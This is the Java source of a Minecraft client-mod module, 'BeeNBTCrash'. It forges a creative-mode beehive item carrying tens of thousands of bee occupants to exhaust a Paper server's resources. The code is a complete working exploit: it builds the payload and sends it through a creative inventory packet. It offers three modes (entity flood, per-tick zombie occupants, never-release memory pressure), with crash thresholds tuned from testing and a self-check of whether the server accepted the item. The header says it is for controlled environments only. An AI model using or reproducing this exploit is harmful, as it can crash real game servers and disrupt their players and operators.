package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.block.entity.BeehiveBlockEntity;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.entity.EntityType;
import net.minecraft.entity.passive.BeeEntity;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.registry.Registries;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.Identifier;
import pwn.noobs.trouserstreak.Trouser;

import java.util.ArrayList;
import java.util.List;

/**
 * BeeNBTCrash — A module for verifying the NBT-based resource exhaustion vulnerability in beehives (for use in controlled environments only)
 *
 * <h2>Vulnerability</h2>
 * List of occupants for a beehive block entity（NBT key {@code bees} / Item Components {@code minecraft:bees}）
 * On Paper 1.21.11 and 26.1.2<b>There are no limits on the number of items or their volume.</b>：
 * <ul>
 *   <li>NBT path：{@code Occupant.LIST_CODEC = CODEC.listOf()}，No maxSize；</li>
 *   <li>Network path：{@code Bees.STREAM_CODEC = Occupant.STREAM_CODEC.apply(ByteBufCodecs.list())}，
 *       The maxSize of {@code ByteBufCodecs.list()} is {@code Integer.MAX_VALUE};</li>
 *   <li>The only "maximum of 3" check is in {@code BeehiveBlockEntity#addOccupant()} (bees naturally enter the box).
 *       NBT / Item Component Path Completely Bypassed;</li>
 *   <li>{@code handleSetCreativeModeSlot} only checks the creative mode, item availability, and stack count; it does not check the component size.</li>
 * </ul>
 * Actual measurements show that each occupier occupies only 5 bytes on the line (1.21.11), and a single packet (8MB uncompressed maximum) ≈ 1.67 million entries.
 *
 * <h2>Why can't I just "change the beehive in my inventory and put it there"?</h2>
 * The server uses the following when placing blocks:<b>The server's own share of the item;</b>Changes made to the inventory in the client application will not be synced.
 * The beehive that was placed was still a regular beehive. It must first be accessed via {@link CreativeInventoryActionC2SPacket}
 * Passing a forged `ItemStack` to the server—this is exactly what the vanilla client does in `MultiPlayerGameMode#handleCreativeModeItemAdd`.
 * The task to perform (using menu slots: 36..44 = shortcut bar 0..8, -1 = discard). After receiving the request, the server will broadcast the slot information back.
 * At this point, your hotbar contains the beehive (with its NBT data) from the server; simply <b>right-click to place it</b>.
 *
 * <h2>Three Modes</h2>
 * <ul>
 *   <li>{@code RELEASE_FLOOD}：{@code min_ticks_in_hive=0} → In the next tick, convert all N items at once into
 *       actual bee entities. Testing showed that 50,000 of them were enough to trigger the watchdog and shut down the server.</li>
 *   <li>{@code ZOMBIE_OCCUPANTS}：{@code entity_data.id} Use on a non-hive dweller (default: pig) → Always release
 *       Instead of being sent out, a complete entity is reconstructed every tick and then discarded; this avoids the creation of persistent entities that would otherwise require cleanup, as it remains resident within the save file.
 *       Tested with 20,000 entries → TPS 14.7, tick 80ms, entity count 0.</li>
 *   <li>{@code NEVER_RELEASE}：{@code min_ticks_in_hive=Integer.MAX_VALUE} → Never release,
 *       In-memory / data persistence / per-tick iteration overhead (benchmarked at 300,000 entries = 2.0 GB heap, 56–128 ms/tick).</li>
 * </ul>
 *
 * <h2>Self-check</h2>
 * 10 ticks after sending, read back the value from that hotbar slot (the server will broadcast it back to the client upon receipt) and print the three possible results:
 * Received a beehive that includes the {@code bees} component (success) / Received a beehive, but the component has been stripped away (likely due to Via or a plugin) /
 * The slot has not changed (the server did not accept the update). Do **not** rely on the presence of a beehive in your inventory as an indicator of success; use this self-check output instead.
 */
public class BeeNBTCrash extends Module {

    public enum Mode {
        /** Unleash the flood: set `min_ticks_in_hive=0`, and all N entities will manifest in the very next tick. */
        RELEASE_FLOOD,
        /** Zombie Occupancy: A non-"inhabitor" type (defaults to "pig"); the entity is never released and is recreated every tick. */
        ZOMBIE_OCCUPANTS,
        /** Never release: `min_ticks_in_hive = Integer.MAX_VALUE` — creates pure in-memory, archival, and traversal pressure. */
        NEVER_RELEASE
    }

    public enum ItemKind {
        BEEHIVE,
        BEE_NEST
    }

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("RELEASE_FLOOD=Release a flood; ZOMBIE_OCCUPANTS=Zombie occupants that are never released; NEVER_RELEASE=Occupy memory indefinitely without ever being released.")
            .defaultValue(Mode.ZOMBIE_OCCUPANTS)
            .build());

    private final Setting<Integer> count = sgGeneral.add(new IntSetting.Builder()
            .name("number-of-occupants")
            .description("The number of entries within the `minecraft:bees` component. Each entry consumes approximately 5 bytes; testing shows that 20,000 entries cause noticeable frame drops, while 50,000 entries—if triggered all at once—will crash the server.")
            .defaultValue(20000)
            .min(1)
            .sliderRange(1, 200000)
            .build());

    private final Setting<Integer> padBytes = sgGeneral.add(new IntSetting.Builder()
            .name("redundant-NBT-bytes")
            .description("Inserting a string of this length into the `entity_data` of every occupant increases both memory usage and save file size (testing shows ~978 MB of heap for 20,000 × 2,000 entries). Set to 0 to disable.")
            .defaultValue(0)
            .min(0)
            .sliderRange(0, 200000)
            .build());

    private final Setting<String> entityType = sgGeneral.add(new StringSetting.Builder()
            .name("entity-type")
            .description("Entity identifier used for RELEASE_FLOOD and NEVER_RELEASE modes.")
            .defaultValue("minecraft:bee")
            .visible(() -> mode.get() != Mode.ZOMBIE_OCCUPANTS)
            .build());

    private final Setting<ItemKind> item = sgGeneral.add(new EnumSetting.Builder<ItemKind>()
            .name("item")
            .description("Which beehive item-holding component is used (both are `BeehiveBlock`, with identical behavior).")
            .defaultValue(ItemKind.BEEHIVE)
            .build());

    private final Setting<Integer> slotOverride = sgGeneral.add(new IntSetting.Builder()
            .name("Hotkey slot (-1 = current)")
            .description("Specify the hotbar slot (0–8) where the forged item should be placed. -1 = the currently held slot.")
            .defaultValue(-1)
            .min(-1)
            .max(8)
            .build());

    private final Setting<Boolean> reportBees = sgGeneral.add(new BoolSetting.Builder()
            .name("count-nearby-bees")
            .description("After sending, there is a delay of approximately 4 seconds before the number of nearby bees is counted and printed; this serves to confirm whether the server has actually begun spawning the entities.")
            .defaultValue(true)
            .visible(() -> mode.get() == Mode.RELEASE_FLOOD)
            .build());

    private int hotbar = -1;
    private int verifyTimer = -1;
    private int reportTimer = -1;
    private int beesBefore = -1;
    private int expectCount = -1;

    public BeeNBTCrash() {
        super(Trouser.operator, "BeeNBTCrash",
                "Create a beehive containing an anomalous `bees` component in your hotbar and place it in the world.");
    }

    @Override
    public void onActivate() {
        verifyTimer = -1;
        reportTimer = -1;
        beesBefore = -1;
        expectCount = -1;

        if (mc.player == null || mc.world == null || mc.getNetworkHandler() == null) {
            error("Not connected to the server.");
            toggle();
            return;
        }

        if (!mc.player.isInCreativeMode()) {
            error("Creative mode required.");
            toggle();
            return;
        }

        int n = count.get();
        int minTicks;
        int ticksInHive = 0;
        String type = entityType.get().trim();

        switch (mode.get()) {
            case ZOMBIE_OCCUPANTS -> {
                minTicks = 0;
                type = "minecraft:pig";
            }
            case NEVER_RELEASE -> minTicks = Integer.MAX_VALUE;
            default -> minTicks = 0;
        }

        ItemStack payload = buildPayload(type, n, ticksInHive, minTicks);
        if (payload == null) {
            toggle();
            return;
        }

        hotbar = slotOverride.get() >= 0 ? slotOverride.get() : mc.player.getInventory().selectedSlot;
        int menuSlot = 36 + hotbar; // Menu slots: 36–44 = Hotbar 0–8
        expectCount = n;

        mc.interactionManager.clickCreativeStack(payload,menuSlot);
        //clickSlot twice to make the item actually appear clientside
        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, menuSlot, 0, SlotActionType.PICKUP, mc.player);
        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, menuSlot, 0, SlotActionType.PICKUP, mc.player);

        info("Sent: Slot = Hotbar slot %d (menu slot %d), Mode = %s, Count = %d, Entity = %s, min_ticks_in_hive = %s",
                hotbar + 1, menuSlot, mode.get(), n, type,
                minTicks == Integer.MAX_VALUE ? "Integer.MAX_VALUE" : String.valueOf(minTicks));
        info("Self-check after 10 ticks; then place it manually by right-clicking.");

        if (n > 20000 && mode.get() == Mode.RELEASE_FLOOD) {
            warning("%dentity flood: Upon placement, the server will spawn %d entities within 1–2 ticks, which could potentially trigger a Watchdog shutdown.", n, n);
        }

        verifyTimer = 10;
        if (reportBees.get() && mode.get() == Mode.RELEASE_FLOOD) {
            beesBefore = nearbyBees();
            reportTimer = 80; // 约 4 秒
        }
    }

    @Override
    public void onDeactivate() {
        verifyTimer = -1;
        reportTimer = -1;
        hotbar = -1;
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) {
            return;
        }

        if (verifyTimer > 0 && --verifyTimer == 0) {
            verifySlot();
        }
        if (reportTimer > 0 && --reportTimer == 0) {
            int now = nearbyBees();
            if (now < 0) {
                info("Unable to count entities (not connected?).");
            } else {
                info("Nearby bees: %d → %d (Δ %d).", beesBefore, now, now - beesBefore);
            }
        }
    }

    /** Reading back a slot from the hotbar: The server will broadcast the data back upon receipt, which allows us to determine whether the server actually received the information and whether the component has been stripped away. */
    private void verifySlot() {
        if (hotbar < 0) {
            return;
        }
        ItemStack now = mc.player.getInventory().getStack(hotbar);
        Item it = now.getItem();
        boolean isHive = it == Items.BEEHIVE || it == Items.BEE_NEST;

        if (!isHive) {
            error("Self-check: Slot %d of the hotbar is %s, not a beehive → The server did not accept this inventory modification.", hotbar + 1, it);
            error("Troubleshooting steps: ① Verify whether the server has actually granted you Creative mode (check the output of the `/gamemode` command; be mindful of potential cross-version or proxy-related issues). ② Check if any plugins are cancelling the `InventoryCreativeEvent`. ③ Examine the server logs for any kick events or decoding errors.");
            return;
        }

        List<BeehiveBlockEntity.BeeData> bees = now.get(DataComponentTypes.BEES);
        if (bees == null || bees.isEmpty()) {
            warning("Self-check: The server has accepted the beehive, but the \"bees\" component is missing from the item (likely stripped away by Via/cross-version translation or a plugin) — therefore, placing it will not result in an anomalous block entity.");
            warning("If you are connecting across versions (using ViaFabricPlus), please re-test using a client that matches the server's version.");
            return;
        }

        info("Self-check passed: The server has accepted this component; number of bees = %d (expected %d). You may now place it manually by right-clicking.", bees.size(), expectCount);
        if (bees.size() != expectCount) {
            warning("Number of items does not match expectation (%d ≠ %d)。", bees.size(), expectCount);
        }
        info("The tooltip will also display \"Bees: %d/3\". Placement advice: choose a clear, sunny day, and ensure the front of the beehive remains unobstructed.", bees.size());
    }

    private int nearbyBees() {
        if (mc.world == null || mc.player == null) {
            return -1;
        }
        try {
            return mc.world.getEntitiesByClass(
                    BeeEntity.class,
                    mc.player.getBoundingBox().expand(96.0),
                    bee -> true
            ).size();
        } catch (Throwable t) {
            return -1;
        }
    }

    /** Construct a beehive item with a `minecraft:bees` component—the payload for the entire exploit. */
    private ItemStack buildPayload(String type, int n, int ticksInHive, int minTicks) {
        Identifier id = Identifier.tryParse(type);
        if (id == null) {
            error("Entity type is not a valid identifier: %s", type);
            return null;
        }
        EntityType<?> et = Registries.ENTITY_TYPE.get(id);
        if (et == null) {
            error("Unknown entity type: %s", type);
            return null;
        }


        // One shared compound; NbtComponent.of does not deep-copy it in 1.21.4.
        NbtCompound tag = new NbtCompound();
        tag.putString("id", Registries.ENTITY_TYPE.getId(et).toString());

        int pad = padBytes.get();
        if (pad > 0) {
            tag.putString("Pad", "x".repeat(pad));
        }

        NbtComponent entityData = NbtComponent.of(tag);

        List<BeehiveBlockEntity.BeeData> occupants = new ArrayList<>(Math.max(16, Math.min(n, 1 << 21)));
        long t0 = System.nanoTime();
        for (int i = 0; i < n; i++) {
            occupants.add(new BeehiveBlockEntity.BeeData(entityData, ticksInHive, minTicks));
        }

        ItemStack stack = new ItemStack(item.get() == ItemKind.BEE_NEST ? Items.BEE_NEST : Items.BEEHIVE);
        try {
            stack.set(DataComponentTypes.BEES, occupants);
        } catch (Throwable t) {
            error("Failed to set up bees component: %s", t);
            return null;
        }
        stack.set(DataComponentTypes.CUSTOM_NAME, Text.literal("§cBeeTest §7" + n + "§8/§7" + type));

        double ms = (System.nanoTime() - t0) / 1e6;
        info("Payload construction complete: %d entries, took %.1fms, data size approx. %.0fKB (5 bytes per entry).", n, ms, n * 5.0 / 1024.0);
        return stack;
    }
}